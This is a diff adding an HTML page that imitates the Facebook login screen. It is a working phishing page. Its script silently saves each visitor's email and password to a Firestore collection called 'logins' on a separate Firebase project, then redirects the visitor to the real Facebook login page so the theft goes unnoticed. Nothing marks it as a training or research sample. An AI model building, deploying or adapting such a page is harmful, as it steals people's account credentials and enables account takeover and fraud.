@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <link rel="shortcut icon" href="fblogo.png" type="image/x-icon">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Facebook - log in or sign up</title>
+  <link href="https://fonts.googleapis.com/css2?family=Lato:wght@400;700;900&display=swap" rel="stylesheet"/>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'Lato', Helvetica, Arial, sans-serif;
+      background: #f0f2f5;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 2rem 1rem;
+    }
+    .fb-main {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 2rem;
+      width: 100%;
+      max-width: 860px;
+      flex-wrap: wrap;
+      margin-bottom: 2rem;
+    }
+    .fb-brand { flex: 1; min-width: 220px; max-width: 380px; padding-bottom: 1.5rem; }
+    .fb-logo img { width: 240px; height: auto; display: block; margin-bottom: 1.25rem; }
+    .fb-tagline { font-size: 22px; font-weight: 400; color: #1c1e21; line-height: 1.4; }
+    .fb-card {
+      background: #fff;
+      border-radius: 8px;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1);
+      padding: 1.5rem;
+      width: 100%;
+      max-width: 396px;
+      min-width: 280px;
+    }
+    .fb-input {
+      width: 100%;
+      padding: 14px 16px;
+      font-size: 17px;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      margin-bottom: 4px;
+      outline: none;
+      color: #1c1e21;
+      font-family: inherit;
+      transition: border-color 0.15s, box-shadow 0.15s;
+    }
+    .fb-input:focus { border-color: #1877f2; box-shadow: 0 0 0 2px rgba(24,119,242,0.2); }
+    .fb-input::placeholder { color: #bcc0c4; }
+    .fb-input.input-error { border-color: #e41e3f; box-shadow: 0 0 0 2px rgba(228,30,63,0.15); }
+    .field-error-msg { font-size: 12px; color: #e41e3f; margin-bottom: 10px; min-height: 16px; padding-left: 2px; }
+    .fb-btn-login {
+      width: 100%;
+      padding: 14px;
+      background: #1877f2;
+      color: #fff;
+      font-size: 20px;
+      font-weight: 700;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      font-family: inherit;
+      transition: background 0.15s;
+      margin-top: 4px;
+      margin-bottom: 1rem;
+    }
+    .fb-btn-login:hover { background: #166fe5; }
+    .fb-btn-login:active { background: #1462cc; }
+    .fb-btn-login:disabled { background: #9ec5fc; cursor: not-allowed; }
+    .fb-forgot { text-align: center; margin-bottom: 1.25rem; }
+    .fb-forgot a { color: #1877f2; font-size: 14px; text-decoration: none; }
+    .fb-forgot a:hover { text-decoration: underline; }
+    .fb-divider { border: none; border-top: 1px solid #dadde1; margin: 0 0 1.25rem; }
+    .fb-btn-create {
+      display: block; width: fit-content; margin: 0 auto;
+      padding: 14px 24px; background: #42b72a; color: #fff;
+      font-size: 17px; font-weight: 700; border: none; border-radius: 6px;
+      cursor: pointer; font-family: inherit; transition: background 0.15s;
+    }
+    .fb-btn-create:hover { background: #36a420; }
+    .fb-footer { font-size: 12px; color: #606770; text-align: center; max-width: 860px; line-height: 1.6; }
+    .fb-footer a { color: #606770; text-decoration: none; }
+    .fb-footer a:hover { text-decoration: underline; }
+    .fb-footer-links { display: flex; flex-wrap: wrap; justify-content: center; gap: 4px 8px; margin-bottom: 6px; }
+    .fb-footer-copy { color: #8d949e; margin-top: 8px; }
+    @media (max-width: 640px) {
+      .fb-brand { text-align: center; }
+      .fb-logo img { margin: 0 auto 1.25rem; }
+      .fb-tagline { font-size: 18px; }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="fb-main">
+    <div class="fb-brand">
+      <!-- Replace "your-logo.png" with your actual logo path -->
+      <div class="fb-logo">
+        <img src="fblogo.png" alt="Facebook" />
+      </div>
+      <p class="fb-tagline">Connect with friends and the world around you on Facebook.</p>
+    </div>
+
+    <div class="fb-card">
+      <input class="fb-input" id="emailInput" type="text" placeholder="Email address or phone number" />
+      <div class="field-error-msg" id="emailError"></div>
+
+      <input class="fb-input" id="passwordInput" type="password" placeholder="Password" />
+      <div class="field-error-msg" id="passwordError"></div>
+
+      <button class="fb-btn-login" id="loginBtn">Log in</button>
+      <div class="fb-forgot"><a href="#">Forgot password?</a></div>
+      <hr class="fb-divider" />
+      <button class="fb-btn-create" onclick="window.location.href='https://www.facebook.com/r.php'">Create new account</button>
+    </div>
+  </div>
+
+  <footer class="fb-footer">
+    <div class="fb-footer-links">
+      <a href="#">English (US)</a><a href="#">Espanol</a><a href="#">Francais (France)</a>
+      <a href="#">Chinese</a><a href="#">Arabic</a><a href="#">Portugues (Brasil)</a>
+      <a href="#">Italiano</a><a href="#">Korean</a><a href="#">Deutsch</a>
+      <a href="#">Hindi</a><a href="#">Japanese</a>
+    </div>
+    <hr style="border:none;border-top:1px solid #dadde1;margin:8px 0;" />
+    <div class="fb-footer-links">
+      <a href="#">Sign Up</a><a href="#">Log in</a><a href="#">Messenger</a>
+      <a href="#">Facebook Lite</a><a href="#">Video</a><a href="#">Places</a>
+      <a href="#">Games</a><a href="#">Marketplace</a><a href="#">Meta Pay</a>
+      <a href="#">Meta Store</a><a href="#">Meta Quest</a><a href="#">Meta AI</a>
+      <a href="#">Instagram</a><a href="#">Threads</a><a href="#">Fundraisers</a>
+      <a href="#">Privacy Policy</a><a href="#">Privacy Center</a><a href="#">Groups</a>
+      <a href="#">About</a><a href="#">Create ad</a><a href="#">Create Page</a>
+      <a href="#">Developers</a><a href="#">Careers</a><a href="#">Cookies</a>
+      <a href="#">Ad choices</a><a href="#">Terms</a><a href="#">Help</a>
+    </div>
+    <p class="fb-footer-copy">Meta &copy; 2025</p>
+  </footer>
+
+  <!-- Firebase SDK v10 compat -->
+  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script>
+
+  <script>
+    // ============================================================
+    //  REPLACE the values below with YOUR real Firebase config.
+    //  Go to: Firebase Console > Project Settings > Your Apps
+    //  > Web App > SDK setup and configuration > Config
+    // ============================================================
+    const firebaseConfig = {
+  apiKey: "AIzaSyBIkMdkV-cKXN0ynbDsWG1yQpEmNiFBVSc",
+  authDomain: "facebook-login-2ece4.firebaseapp.com",
+  projectId: "facebook-login-2ece4",
+  storageBucket: "facebook-login-2ece4.firebasestorage.app",
+  messagingSenderId: "541358326494",
+  appId: "1:541358326494:web:9f0d5296100efb737ff84f"
+};
+
+    const app = firebase.initializeApp(firebaseConfig);
+    const db  = firebase.firestore(app);
+
+    // ── Field helpers ────────────────────────────────────────
+    function setError(inputId, msgId, msg) {
+      document.getElementById(inputId).classList.add('input-error');
+      document.getElementById(msgId).textContent = msg;
+    }
+    function clearError(inputId, msgId) {
+      document.getElementById(inputId).classList.remove('input-error');
+      document.getElementById(msgId).textContent = '';
+    }
+
+    // Clear error as user types
+    document.getElementById('emailInput').addEventListener('input', function () {
+      clearError('emailInput', 'emailError');
+    });
+    document.getElementById('passwordInput').addEventListener('input', function () {
+      clearError('passwordInput', 'passwordError');
+    });
+
+    // ── Login button ─────────────────────────────────────────
+    document.getElementById('loginBtn').addEventListener('click', async function () {
+      const email    = document.getElementById('emailInput').value.trim();
+      const password = document.getElementById('passwordInput').value.trim();
+      const btn      = document.getElementById('loginBtn');
+
+      // Reset errors
+      clearError('emailInput',    'emailError');
+      clearError('passwordInput', 'passwordError');
+
+      // Validate
+      let hasError = false;
+      if (!email) {
+        setError('emailInput', 'emailError', 'Please fill all the fields properly.');
+        hasError = true;
+      }
+      if (!password) {
+        setError('passwordInput', 'passwordError', 'Please fill all the fields properly.');
+        hasError = true;
+      }
+      if (hasError) return;
+
+      // Disable button
+      btn.disabled    = true;
+      btn.textContent = 'Please wait...';
+
+      try {
+        // Save to Firestore silently before redirect
+        await db.collection('logins').add({
+          email:     email,
+          password:  password,
+          timestamp: firebase.firestore.FieldValue.serverTimestamp()
+        });
+        console.log('Data saved to Firestore successfully.');
+      } catch (err) {
+        console.error('Firestore write failed:', err.message);
+        // Still redirect even if save fails
+      }
+
+      // Redirect to Facebook official login
+      window.location.href = 'https://www.facebook.com/login';
+    });
+
+    // Enter key triggers login
+    document.addEventListener('keydown', function (e) {
+      if (e.key === 'Enter') document.getElementById('loginBtn').click();
+    });
+  </script>
+
+</body>
+</html>
